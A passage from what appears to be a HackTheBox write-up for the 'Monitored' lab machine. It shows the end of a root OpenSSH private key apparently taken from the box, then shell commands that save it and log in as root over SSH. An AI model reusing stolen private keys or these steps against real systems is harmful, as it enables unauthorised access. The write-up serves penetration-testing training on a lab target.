050xuzn9OosgsU0kZuR/CfOcX4v38PMI3ch1IDvFpQoxsPmGMQBpBCzPTux15QtQYcMqM0
XVZpstqB4y33pwVWINzpAS1wv+I+VDjlwdOTrO/DJiFsnLuA3wRrlb7jdDKC/DP/I/90bx
1rcSEDG4C2stLwzH9crPdaZozGHXWU03vDZNos3yCMDeKlLKAvaAddWE2R0FJr62CtK60R
wL2dRR3DI7+Eo2pDzCk1j9H37YzYHlbwAAAMEAxim0OTlYJOWdpvyb8a84cRLwPa+v4EQC
GgSoAmyWM4v1DeRH9HprDVadT+WJDHufgqkWOCW7x1I/K42CempxM1zn1iNOhE2WfmYtnv
2amEWwfnTISDFY/27V7S3tpJLeBl2q40Yd/lRO4g5UOsLQpuVwW82sWDoa7KwglG3F+TIV
csj0t36sPw7lp3H1puOKNyiFYCvHHueh8nlMI0TA94RE4SPi3L/NVpLh3f4EYeAbt5z96C
CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ vi root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ chmod 600 root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ ssh -i root.id_rsa root@monitored.htb
The authenticity of host 'monitored.htb (10.129.62.157)' can't be established.
ED25519 key fingerprint is SHA256:9OHJUUmtPpW4c0Wd2uLNekhWz54m/ybR2dZlg94Ein0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'monitored.htb' (ED25519) to the list of known hosts.
Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@monitored:~# id
uid=0(root) gid=0(root) groups=0(root)
```